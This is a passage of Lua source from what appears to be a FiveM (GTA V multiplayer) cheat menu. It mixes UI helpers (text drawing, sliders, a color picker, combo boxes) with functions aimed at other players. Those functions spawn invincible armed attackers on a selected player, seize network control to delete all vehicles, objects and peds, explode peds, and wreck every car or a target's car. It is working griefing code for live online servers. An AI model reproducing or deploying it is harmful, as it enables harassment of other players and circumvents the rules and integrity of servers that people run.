           if not sum.f.HasModelLoaded(sum.f.GetHashKey(gangn)) then 
               sum.f.RequestModel(sum.f.GetHashKey(gangn))
           end 
           local spawngang = sum.f.CreatePed(0, sum.f.GetHashKey(gangn), sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)), 1, 1, 1)
           sum.f.SetEntityInvincible(spawngang, true)
           sum.f.GiveWeaponToPed(spawngang, sum.f.GetHashKey(gangnguns), 200, 1, 1)
           sum.f.TaskCombatPed(spawngang, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
       end
   
       function sum.f.slamobjects()
           for objects in sum.f.enumerateObjects() do
                   sum.f.ApplyForceToEntity(objects, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           function sum.f.DeleteAllShits(entity)
               if not sum.f.DoesEntityExist(entity) then
                   return
               end
               sum.f.NetworkRequestControlOfEntity(entity)
               sum.f.SetEntityAsMissionEntity(entity, true, true)
               sum.f.DeletePed(entity)
               sum.f.DeleteEntity(entity)
               sum.f.DeleteObject(entity)
               sum.f.DeleteVehicle(entity)
           end
   
               
           function sum.f.DeletePeds(entity)
               if not sum.f.DoesEntityExist(entity) then
                   return
               end
               sum.f.NetworkRequestControlOfEntity(entity)
               sum.f.SetEntityAsMissionEntity(entity, true, true)
               sum.f.DeletePed(entity)
           end
   
           function sum.f.DeleteEntities(entity)
               if not sum.f.DoesEntityExist(entity) then
                   return
               end
               sum.f.NetworkRequestControlOfEntity(entity)
               sum.f.SetEntityAsMissionEntity(entity, true, true)
               sum.f.DeleteEntity(entity)
           end
   
           function sum.f.DeleteObjects(entity)
               if not sum.f.DoesEntityExist(entity) then
                   return
               end
               sum.f.NetworkRequestControlOfEntity(entity)
               sum.f.SetEntityAsMissionEntity(entity, true, true)
               sum.f.DeleteObject(entity)
           end
   
           function sum.f.DeleteVehicles(entity)
               if not sum.f.DoesEntityExist(entity) then
                   return
               end
               sum.f.NetworkRequestControlOfEntity(entity)
               sum.f.SetEntityAsMissionEntity(entity, true, true)
               sum.f.DeleteVehicle(entity)
           end            
           
           function sum.f.deleteall()
               for veh in sum.f.enumerateVehicles() do
                   sum.f.DeleteAllShits(veh)
               end
               for objects in sum.f.enumerateObjects() do
                   sum.f.DeleteAllShits(objects)
               end
               for ped in sum.f.enumeratePeds() do
                   sum.f.DeleteAllShits(ped)
               end
           end
   
           function sum.f.deletevehicles()
                for veh in sum.f.enumerateVehicles() do
                       sum.f.DeleteVehicles(veh)
                   end
               end      
               
           function sum.f.deleteobjects()
               for objects in sum.f.enumerateObjects() do
                       sum.f.DeleteObjects(objects)
                   end
               end  
   
           function sum.f.deletepeds()
               for ped in sum.f.enumeratePeds() do
                       sum.f.DeletePeds(ped)
                   end
               end
   
   
           function sum.f.pedsexplode()
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local position = sum.f.GetEntityCoords(ped)
                   sum.f.AddExplosion(position, 7, 100.0, true, false, 1.0)
               end
           end
       end
       
       function sum.f.armyattack()
           local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
           local pullp = {"cs_casey","cs_casey","cs_casey",}
           local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_ASSAULTRIFLE", "WEAPON_MINIGUN"}
           local gangnguns = (guns[math.random(#guns)])
           local gangn = (pullp[math.random(#pullp)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(gangn)) then 
               sum.f.RequestModel(sum.f.GetHashKey(gangn))
           end 
           local spawngang = sum.f.CreatePed(0, sum.f.GetHashKey(gangn), sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)), 1, 1, 1)
           sum.f.SetEntityInvincible(spawngang, true)
           sum.f.GiveWeaponToPed(spawngang, sum.f.GetHashKey(gangnguns), 200, 1, 1)
           sum.f.TaskCombatPed(spawngang, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
       end
   
       function sum.f.launchpeds()
           for ped in sum.f.enumeratePeds() do
               if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.ApplyForceToEntity(ped, 3, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
           end
       end
   end
   
       function sum.f.WepFromHash(hashcode)
           for i = 1, #sum.ALLWEAPONS do
               if sum.f.GetHashKey(sum.ALLWEAPONS[i]) == hashcode then
                   return string.sub(sum.ALLWEAPONS[i], 8)
               end
           end
       end
   
   function sum.f.DestroyCars()
       for veh in sum.f.enumerateVehicles() do
           sum.f.requestControlOnce(veh)
           if 	sum.f.NetworkRequestControlOfEntity(veh) then
               sum.f.SetVehicleNumberPlateText(veh, 'fivesens')
               sum.f.SetVehicleCustomPrimaryColour(veh, 149, 184, 6)
               sum.f.SetVehicleCustomSecondaryColour(veh, 149, 184, 6)
               sum.f.SetEntityAsMissionEntity(veh, false, false)
               sum.f.StartVehicleAlarm(veh)
               sum.f.PopOutVehicleWindscreen(veh)
               sum.f.SmashVehicleWindow(veh, 0)sum.f.SmashVehicleWindow(veh, 1)sum.f.SmashVehicleWindow(veh, 2)sum.f.SmashVehicleWindow(veh, 3)
               sum.f.SetVehicleTyreBurst(veh, 0, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 1, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 2, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 3, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 5, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 7, true, 1000.0)
               sum.f.SetVehicleDoorBroken(veh, 0, true)sum.f.SetVehicleDoorBroken(veh, 1, true)sum.f.SetVehicleDoorBroken(veh, 2, true)sum.f.SetVehicleDoorBroken(veh, 3, true)sum.f.SetVehicleDoorBroken(veh, 4, true)sum.f.SetVehicleDoorBroken(veh, 5, true)sum.f.SetVehicleDoorBroken(veh, 6, true)sum.f.SetVehicleDoorBroken(veh, 7, true)
           end
       end
   end
   
   function sum.f.DestroyCar()
           if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
           local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
           if 	sum.f.NetworkRequestControlOfEntity(veh) then
               sum.f.sendNotification(''..sum.f.GetPlayerName(sel.selectedPlayer)..' vehicle is destroyer', 'Online')
               sum.f.SetVehicleNumberPlateText(veh, 'fivesens')
               sum.f.SetVehicleCustomPrimaryColour(veh, 149, 184, 6)
               sum.f.SetVehicleCustomSecondaryColour(veh, 149, 184, 6)
               sum.f.SetEntityAsMissionEntity(veh, false, false)
               sum.f.StartVehicleAlarm(veh)
               sum.f.PopOutVehicleWindscreen(veh)
               sum.f.SmashVehicleWindow(veh, 0)sum.f.SmashVehicleWindow(veh, 1)sum.f.SmashVehicleWindow(veh, 2)sum.f.SmashVehicleWindow(veh, 3)
               sum.f.SetVehicleTyreBurst(veh, 0, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 1, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 2, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 3, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 5, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 7, true, 1000.0)
               sum.f.SetVehicleDoorBroken(veh, 0, true)sum.f.SetVehicleDoorBroken(veh, 1, true)sum.f.SetVehicleDoorBroken(veh, 2, true)sum.f.SetVehicleDoorBroken(veh, 3, true)sum.f.SetVehicleDoorBroken(veh, 4, true)sum.f.SetVehicleDoorBroken(veh, 5, true)sum.f.SetVehicleDoorBroken(veh, 6, true)sum.f.SetVehicleDoorBroken(veh, 7, true)
           end
       end
   end
   
   function sum.f.rotationToDirection(a)
       local b = sum.curak.rad(a.z)
       local c = sum.curak.rad(a.x)
       local d = sum.curak.abs(sum.curak.cos(c))
       return sum.curak.vector3(-sum.curak.sin(b) * d, sum.curak.cos(b) * d, sum.curak.sin(c))
   end
   
   function sum.f.clicked()
       return sum.f.IsDisabledControlJustPressed(0, 24)
   end
   
   
   function sum.f.drawText(text, x, y, scale, font, center)
       sum.f.SetTextScale(0.0, scale)
       sum.f.SetTextFont(font)
       sum.f.SetTextCentre(center)
   
       sum.f.BeginTextCommandDisplayText('TWOSTRINGS')
       sum.f.AddTextComponentString(text)
       sum.f.EndTextCommandDisplayText(x, y-0.011)
   end
   
   function sum.f.drawTextOutline(text, x, y, scale, font, outline, center, r, g, b)
       sum.f.SetTextScale(0.0, scale)
       sum.f.SetTextFont(font)
       if outline then
       sum.f.SetTextOutline(outline)
       else end
       sum.f.SetTextCentre(center)
       sum.f.SetTextColour(r, g, b, 255)
       sum.f.BeginTextCommandDisplayText('TWOSTRINGS')
       sum.f.AddTextComponentString(text)
       sum.f.EndTextCommandDisplayText(x, y-0.011)
   end
   
   sum.f.DrawRect = function(x, y, w, h, r, g, b, a)
       return sum.curak.inv(0x3A618A217E5154F0, x, y, w, h, r, g, b, a)
   end
   
   function sum.f.getWidth(str, font, scale)
       sum.f.BeginTextCommandWidth("STRING")
       sum.f.AddTextComponentSubstringPlayerName(str)
       sum.f.SetTextFont(font or 4)
       sum.f.SetTextScale(scale or 0.35, scale or 0.35)
       local length = sum.f.EndTextCommandGetWidth(1)
       return length
   end
   
   function sum.f.mouse(x, y, w, h)
       local X, Y = sum.f.getmousepos()
       local a, b = w / 2, h / 2
       if (X >= x - a and X <= x + a and Y >= y - b and Y <= y + b) then 
           return true 
       end
   end
   
   function sum.f.lerp(A, B, T)
       if A > 1 then 
           return T 
       end
       if A < 0 then 
           return B 
       end
       return B+(T-B)*A
   end
   
   function sum.f.requestControlOnce(entity)
       if sum.f.NetworkHasControlOfEntity(entity) then
          return true
       end
       sum.f.SetNetworkIdCanMigrate(sum.f.NetworkGetNetworkIdFromEntity(entity), true)
       return sum.f.NetworkRequestControlOfEntity(entity)
    end
   
   function sum.f.getSeatPedIsIn(ped)
       if not sum.f.IsPedInAnyVehicle(ped, false) then
           return
       else
           veh = sum.f.GetVehiclePedIsIn(ped)
           for i = 0, sum.f.GetVehicleMaxNumberOfPassengers(veh) do
               if sum.f.GetPedInVehicleSeat(veh) then
                   return i
               end
           end
       end
   end
   
   function sum.f.camDirect()
       local heading = sum.f.GetGameplayCamRelativeHeading() + sum.f.GetEntityHeading(sum.f.PlayerPedId())
       local pitch = sum.f.GetGameplayCamRelativePitch()
       local x = -math.sin(heading * math.pi / 180.0)
       local y = math.cos(heading * math.pi / 180.0)
       local z = math.sin(pitch * math.pi / 180.0)
       local len = math.sqrt(x * x + y * y + z * z)
       if len ~= 0 then
           x = x / len
           y = y / len
           z = z / len
       end
       return x, y, z
   end
   
   if not sum.f.HasStreamedTextureDictLoaded('mpentry') then 
       sum.f.RequestStreamedTextureDict('mpentry', 1) 
   end
   
   function sum.f.separator(text, x, y) 
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW/2+dW/4
       else
           x = x + dW/2-dW/4
       end
       x = x + drag_X ; y = y + drag_Y
       x = x + 0.054
       sum.f.drawText(text, x, y+0.001, 0.27, 4, true)
       local abc = sum.f.getWidth(text, 4, 0.6)
       local rX, rY = sum.f.GetActiveScreenResolution()
       if sum.c['settings-MainFade'] then 
           sum.f.DrawSprite('mpentry', 'mp_modenotselected_gradient', x, y, 0.16+ dW/2, 21/rY, 0.0, 1, 1, 1, 255)
       end 
       if sum.c['settings-Fade'] then 
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',x, y + 0.008, abc, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',x, y - 0.008, abc, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
       end
   
       local abc = sum.f.getWidth(text, 4, 0.14)
       if sum.c['settings-Line'] then 
           sum.f.DrawRect(x-abc, y, 0.005, 1/rY, 255, 255, 255, 255)   
           sum.f.DrawRect(x+abc, y, 0.005, 1/rY, 255, 255, 255, 255)   
       end
       
       if sum.c['settings-corner'] then 
           sum.f.DrawRect(x-abc, y-0.0052, 0.002, 1/rY, 255, 255, 255, 255)
           sum.f.DrawRect(x+abc, y-0.0052, 0.002, 1/rY, 255, 255, 255, 255)
           sum.f.DrawRect(x-abc, y+0.0052, 0.002, 1/rY, 255, 255, 255, 255)
           sum.f.DrawRect(x+abc, y+0.0052, 0.002, 1/rY, 255, 255, 255, 255)
           sum.f.DrawRect(x+abc+0.0012, y-0.0045, 1/rX, 0.002, 255, 255, 255, 255)
           sum.f.DrawRect(x-abc-0.0009, y-0.0045, 1/rX, 0.002, 255, 255, 255, 255)
           sum.f.DrawRect(x+abc+0.0012, y+0.0045, 1/rX, 0.002, 255, 255, 255, 255)
           sum.f.DrawRect(x-abc-0.0009, y+0.0045, 1/rX, 0.002, 255, 255, 255, 255)
       end
   end
   
   function sum.f.slider(slider, x, y, dum)
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW/2
       end
       x = x + drag_X ; y = y + drag_Y
       x = x + 0.0515
       local wslid = 0.115+dW/2
       local resX, resY = sum.f.GetActiveScreenResolution()
       sum.f.DrawRect((dW/2)/2+x, y, wslid+0.002, 7/resY, 55, 55, 55, 255)
       sum.f.DrawRect((dW/2)/2+x, y, wslid+0.001, 5/resY, 22, 22, 22, 255)
       sum.f.DrawRect((dW/2)/2+x + (slider.value/(slider.max/wslid)/2) - wslid/2, y, (slider.value/(slider.max/wslid)), 3/resY, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
       sum.f.SetTextOutline()
       sum.f.drawText(slider.value, (dW/2)/2+x + (slider.value/(slider.max/wslid)) - wslid/2, y+0.002, 0.21, 4, true)
       local CX, CY = sum.f.getmousepos()
       local sxl, sxr = x - (0.5-0.440), x + ((0.557+(dW/2))-0.5)
       if (sum.f.mouse((dW/2)/2+x, y, wslid+0.002, 7/resY)) and sum.f.IsDisabledControlPressed(0, 69)  then
           local aa = (((CX)-(sxl))/(sxr-sxl))*(slider.max-slider.min)-slider.min
           if dum then 
               slider.value = tonumber(sum.curak.format("%."..dum.."f", aa))
           else
               slider.value = math.floor(aa)
           end
       end
       if slider.value > slider.max then
           slider.value = slider.max
       elseif slider.value < slider.min then
           slider.value = slider.min
       end
   end
   
   sum.f.hsvToRgb = function(h, s, v, a)
       local r, g, b
       local i = sum.curak.floor(h * 6);
       local f = h * 6 - i;
       local p = v * (1 - s);
       local q = v * (1 - f * s);
       local t = v * (1 - (1 - f) * s);
       i = i % 6
       if i == 0 then 
           r, g, b = v, t, p
       elseif i == 1 then 
           r, g, b = q, v, p
       elseif i == 2 then 
           r, g, b = p, v, t
       elseif i == 3 then 
           r, g, b = p, q, v
       elseif i == 4 then 
           r, g, b = t, p, v
       elseif i == 5 then 
           r, g, b = v, p, q
       end
       return sum.curak.floor(r * 255 + 0.5), sum.curak.floor(g * 255 + 0.5), sum.curak.floor(b * 255 + 0.5), sum.curak.floor(a * 255)
   end
   
   sum.f.AddVectors = function(vect1, vect2)
       return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
   end
   
   sum.f.SubVectors = function(vect1, vect2)
       return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
   end
   
   sum.f.ScaleVector = function(vect, mult)
       return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
   end
   
   sum.f.ApplyForce = function(entity, direction)
       ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
   end
   
   sum.f.Oscillate = function(entity, position, angleFreq, dampRatio)
       local pos1 = sum.f.ScaleVector(sum.f.SubVectors(position, sum.f.GetEntityCoords(entity)), (angleFreq * angleFreq))
       local pos2 = sum.f.AddVectors(sum.f.ScaleVector(sum.f.GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
       local targetPos = sum.f.SubVectors(pos1, pos2)
       sum.f.ApplyForce(entity, targetPos)
   end
   
   
   sum.f.Rectangle = function(x, y, w, h, r, g, b, a)
       local scrW, scrH = sum.f.GetActiveScreenResolution()
       local ratioX, ratioY = 1 / scrW, 1 / scrH
       local actualX, actualY = ratioX * x, ratioY * y
       local actualW, actualH = ratioX * w, ratioY * h
       sum.f.DrawRect(actualX + actualW / 2, actualY + actualH / 2, actualW, actualH, r, g, b, a)
   end
   
   sum.f.Gradient = function(x, y, w, h, horizontal, r, g, b, a, r1, g1, b1, a2)
       if horizontal then
           for i = 0, w, 2 do
               if i > w then
                   break
               end
               local a = sum.curak.floor((a2 - a) / w * i + a)
               sum.f.Rectangle(x + i, y, i < w - 1 and 2 or 1, h, r1, g1, b1, sum.curak.abs(a))
           end
       else
           for i = 0, h, 2 do
               if i > h then
                   break
               end
               local a = sum.curak.floor((a2 - a) / h * i + a)
               sum.f.Rectangle(x, y + i, w, i < h - 1 and 2 or 1, r1, g1, b1, sum.curak.abs(a))
           end
       end
   end
   sum.f.HSVGradient = function(x, y, w, h, horizontal, h1, s1, v1, h2, s2, v2)
       sum.f.Rectangle(x, y, w, h, sum.f.hsvToRgb(h1, s1, v1, 1))
       if horizontal then
           for i = 0, w, 2 do
               local _h, s, v = ((h2 - h1) / w) * i + h1, ((s2 - s1) / w) * i + s1, ((v2 - v1) / w) * i + v1
               sum.f.Rectangle(x + i, y, 2, h, sum.f.hsvToRgb(_h, s, v, 1))
           end
       else
           for i = 0, h, 2 do
               local _h, s, v = ((h2 - h1) / h) * i + h1, ((s2 - s1) / h) * i + s1, ((v2 - v1) / h) * i + v1
               sum.f.Rectangle(x, y + i, w, 2, sum.f.hsvToRgb(_h, s, v, 1))
           end
       end
   end
   
   
   
   sum.f.GetScreenSize = function()
       local x, y = sum.f.GetActiveScreenResolution()
       return {x = x, y = y}
   end
   
   
   sum.f.ColorPicker = function(R, G, B)
       sum.f.colorpicker = true
       sum.f.open = false
       local H, S, V = sum.f.hsvToRgb(R, G, B, 1)
       local R = {
           HSV = {H = 0,S = 0,V = 0},
           RGB = {R = R,G = G,B = B},Held = {Hue = false,Value = false},Opened = false,Turned = true,
       }
       sum.f.sendNotification('Previous Color: R: '..R.RGB.R..' G: '..R.RGB.G.. ' B: '..R.RGB.B, 'Color Picker') 
   
       while R.Turned do
           sum.f.DisableControlAction(0, 1, true) -- LookLeftRight
           sum.f.DisableControlAction(0, 2, true) -- LookUpDown
           sum.f.DisableControlAction(0, 142, true) -- MeleeAttackAlternate
           sum.f.DisableControlAction(0, 322, true) -- ESC
           sum.f.DisableControlAction(0, 106, true) -- VehicleMouseControlOverride
           sum.f.DisableControlAction(0, 25, true) -- MOUSE 2
           sum.f.DisableControlAction(0, 24, true) -- Attack
           sum.f.DisableControlAction(0, 257, true) -- Attack2
           sum.f.DisableControlAction(0, 32, true) -- W
           sum.f.DisableControlAction(0, 31, true) -- S
           sum.f.DisableControlAction(0, 30, true) -- D
           sum.f.DisableControlAction(0, 34, true) -- A
           sum.f.DisableControlAction(0, 23, true) -- F
           sum.f.DisableControlAction(0, 22, true) -- Jump
           sum.f.DisableControlAction(0, 16, true) -- Wep Scroll
           sum.f.DisableControlAction(0, 17, true) -- Wep Scroll
   
           local getMousePosX, getMousePosY = sum.f.getmousepos()
           local drag_X = 0
           local drag_Y = 0
           local w, h = sum.f.GetScreenSize().x, sum.f.GetScreenSize().y
           local baseX, baseY = (w / 2 - 100), (h / 2 - 100)
           sum.f.drawTextOutline('o', getMousePosX, getMousePosY, 0.2, 0, true, true, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
       
           
           sum.f.Rectangle(0, 0, w, h, 24, 24, 24, 200)
   
           sum.f.Rectangle(baseX - 2, baseY - 2, 204, 208, 20, 20, 20, 255)
           sum.f.Rectangle(baseX - 1, baseY - 1, 202, 206, 55, 55, 55, 255)
           sum.f.Rectangle(baseX, baseY, 200, 204,  20, 20, 20, 255)
           sum.f.Rectangle(baseX, baseY, 200, 1, R.RGB.R, R.RGB.G, R.RGB.B, 255)
           --[[sum.f.Rectangle(baseX - 2 + 5, baseY - 2 + 196, 194, 26, 18, 18, 18, 255)
           sum.f.Rectangle(baseX - 1 + 5, baseY - 1 + 196, 192, 24, 55, 55, 55, 255)
           sum.f.Rectangle(baseX + 5, baseY + 196, 190, 22,  20, 20, 20, 255)
           sum.f.drawText("Color", 0.451, 0.58, 0.23, 4, true, true)
           sum.f.drawText("R: ".. R.RGB.R.. " G: ".. R.RGB.G.. " B: ".. R.RGB.B.. ", Confirm with enter", 0.451, 0.59, 0.23, 4, true, true)]]
           local r, g, b, a = sum.f.hsvToRgb(R.HSV.H, 1, 1, 1) 
           sum.f.Rectangle(baseX + 10, baseY + 10, 160, 180, r, g, b, 255)
           sum.f.Gradient(baseX + 10, baseY + 10, 160, 180, true, r, g, b, 255, 255, 255, 255, 0)
           sum.f.Gradient(baseX + 10, baseY + 10, 160, 180, false, 255, 255, 255, 0, 0, 0, 0, 255)
           sum.f.HSVGradient(baseX + 20 + 160, baseY + 10, 10, 180, false, 0, 1, 1, 1, 1, 1)
           local x, y = sum.f.GetNuiCursorPosition()
           local w, h = sum.f.GetScreenSize().x, sum.f.GetScreenSize().y
   
           if sum.f.IsControlJustPressed(0, 18) then
               if x > baseX + 20 and x < baseX + 20 + 160 and y > baseY + 10 and y < baseY + 10 + 180 then
                   R.Held.Value = true
               end
               if x > baseX + 20 + 160 and x < baseX + 20 + 160 + 10 and y > baseY + 10 and y < baseY + 10 + 180 then
                   R.Held.Hue = true
               end
               if x < baseX or x > baseX + 200 or y < baseY or y > baseY + 200 then
                   R.Opened = false
               end
           end
           if sum.f.IsDisabledControlPressed(0, 69)  then
               if R.Held.Value then
                   local SR = x - baseX - 10
                   local VR = y - baseY - 60
                   R.HSV.S = sum.curak.clamp(SR / 180, 0, 1)
                   R.HSV.V = sum.curak.clamp(1 - VR / 160, 0, 1)
               end
               if R.Held.Hue then
                   local H = y - baseY + -19
                   R.HSV.H = sum.curak.clamp(H / 180, 0, 1)
               end
               local r, g, b, a = sum.f.hsvToRgb(R.HSV.H, R.HSV.S, R.HSV.V, 1)
               R.RGB.R, R.RGB.G, R.RGB.B = r, g, b
           else
               if R.Held.Value then
                   R.Opened = false
               end
               R.Held.Value = false
               R.Held.Hue = false
           end
   
       
   
           if sum.f.IsDisabledControlJustPressed(0, 191) then
               sum.f.open = true
               sum.f.colorpicker = false
               R.Turned = false
               sum.f.sendNotification('New Color: R: '..R.RGB.R..' G: '..R.RGB.G.. ' B: '..R.RGB.B, 'Color Picker') 
               return R.RGB.R, R.RGB.G, R.RGB.B
           end
           sum.curak.wait(0)
       end
   end
   
   function sum.f.comboGlife(text, items, x, y, currentIndex, callback)
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       
      
       if type(items) == "table" then
           
           local width = sum.f.getWidth(text, 4, 0.27)
           if x == 0.51 then 
               x = x + dW/2
           end
           sum.f.drawText(text, x+drag_X-0.008+dW, y+ drag_Y+0.001, 0.27, 4, false)        
           if sum.f.mouse((x-0.008)+width/2+ drag_X+dW, y+0.001+ drag_Y, width, 0.018) and sum.f.clicked() then 
             return true
           end 
           local selectedItem = items[tonumber(currentIndex)] or items[1]
           local width = sum.f.getWidth(selectedItem, 4, 0.27)
           if x == 0.51 then 
               x = x + dW
           else
               x = x + dW/2
           end
           x = x + drag_X ; y = y + drag_Y
           x = x + 0.108
            
           local itemsCount = #items
           local currentItem = currentIndex
           local cursor_x, cursor_y = sum.f.GetNuiCursorPosition() 
           local widht, height = sum.f.GetActiveScreenResolution()
           cursor_x = cursor_x / widht
           cursor_y = cursor_y / height
           local width = sum.f.getWidth(selectedItem, 4, 0.3)
           local width2 = sum.f.getWidth(selectedItem, 4, 0.01)
   
   
           sum.f.drawText(selectedItem, x-width-0.04+dW/2, y+0.001, 0.27, 4, false)
           sum.f.RequestStreamedTextureDict('commonmenu', 1)
           sum.f.DrawSprite("commonmenu", "arrowleft", x-width-0.045+dW/2, y, 0.01, 0.014, 0.0, sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value, 255)
           sum.f.DrawSprite("commonmenu", "arrowright", x-width2-0.035+dW/2, y, 0.01, 0.014, 0.0, sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value, 255)
           if sum.f.mouse(x-width2-0.035+dW/2, y, 0.01, 0.018) and sum.f.clicked() then 
               if currentItem + 1 > itemsCount then
                   currentItem = 1
                   callback(currentItem)
               else
                   currentItem =  currentItem + 1
                   callback(currentItem)
               end
           end
           if sum.f.mouse(x-width-0.045+dW/2, y, 0.01, 0.018) and sum.f.clicked() then 
               if currentItem - 1 == 0 then
                   currentItem = itemsCount
                   callback(currentItem)
               else
                   currentItem = currentItem - 1
                   callback(currentItem)
               end
           end
           
       end
   end
   
   
   function sum.f.sendNotification(text, subtext)
       table.insert(sum.notifications, {text = text, subtext = subtext, X = 0.0, index = sum.notifiindex, alpha = 255, gametime = sum.f.GetGameTimer()})
       sum.notifiindex = sum.notifiindex + 1
   end
   
   function sum.f.removeNotification(k)
       table.remove(sum.notifications, k)
       sum.notifiindex = sum.notifiindex - 1
   end
   
   
   function sum.f.KeySimulation(key, delay)
       sum.curak.thr(function()
           sum.f.PressKey(key)
           sum.curak.wait(delay)
           sum.f.ReleasePressedKey(key)
       end)
   end
   
       
   
   
   function sum.f.combo(text, items, x, y, currentIndex, callback)
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       
      
       if type(items) == "table" then
           
           local width = sum.f.getWidth(text, 4, 0.27)
           if x == 0.51 then 
               x = x + dW/2
           end
           sum.f.drawText(text, x+ drag_X-0.008, y+ drag_Y+0.001, 0.27, 4, false)        
           if sum.f.mouse((x-0.008)+width/2+ drag_X, y+0.001+ drag_Y, width, 0.018) and sum.f.clicked() then 
             return true
           end 
           local selectedItem = items[tonumber(currentIndex)] or items[1]
           local width = sum.f.getWidth(selectedItem, 4, 0.27)
           if x == 0.51 then 
               x = x + dW
           else
               x = x + dW/2
           end
           x = x + drag_X ; y = y + drag_Y
           x = x + 0.108
            
           local itemsCount = #items
           local currentItem = currentIndex
           local cursor_x, cursor_y = sum.f.GetNuiCursorPosition() 
           local widht, height = sum.f.GetActiveScreenResolution()
           cursor_x = cursor_x / widht
           cursor_y = cursor_y / height
           local width = sum.f.getWidth(selectedItem, 4, 0.3)
           local width2 = sum.f.getWidth(selectedItem, 4, 0.01)
   
   
           sum.f.drawText(selectedItem, x-width-0.0004, y+0.001, 0.27, 4, false)
           sum.f.RequestStreamedTextureDict('commonmenu', 1)
           sum.f.DrawSprite("commonmenu", "arrowleft", x-width-0.004, y, 0.01, 0.014, 0.0, sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value, 255)
           sum.f.DrawSprite("commonmenu", "arrowright", x-width2+0.004, y, 0.01, 0.014, 0.0, sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value, 255)
           if sum.f.mouse(x, y, 0.01, 0.018) and sum.f.clicked() then 
               if currentItem + 1 > itemsCount then
                   currentItem = 1
                   callback(currentItem)
               else
                   currentItem =  currentItem + 1
                   callback(currentItem)
               end
           end
           if sum.f.mouse(x-width-0.005, y, 0.01, 0.018) and sum.f.clicked() then 
               if currentItem - 1 == 0 then
                   currentItem = itemsCount
                   callback(currentItem)
               else
                   currentItem = currentItem - 1
                   callback(currentItem)
               end
           end
           
       end
   end
   
   
   function sum.f.button(text, x, y) 
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW/2
       end
       x = x + drag_X ; y = y + drag_Y
       local resX, resY = sum.f.GetActiveScreenResolution()
       local width = sum.f.getWidth(text, 4, 0.27)
       sum.f.drawText(text, x-0.008, y+0.001, 0.27, 4, false)
       
   
       
       if sum.f.mouse(x-0.004+width/2, y, 0.0078125+width, 0.0138888889) and sum.f.clicked() then 
           return true
       end
   end
   
   function sum.f.pickerbutton(r, g, b, x, y) 
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW
           else
               x = x + dW/2
       end
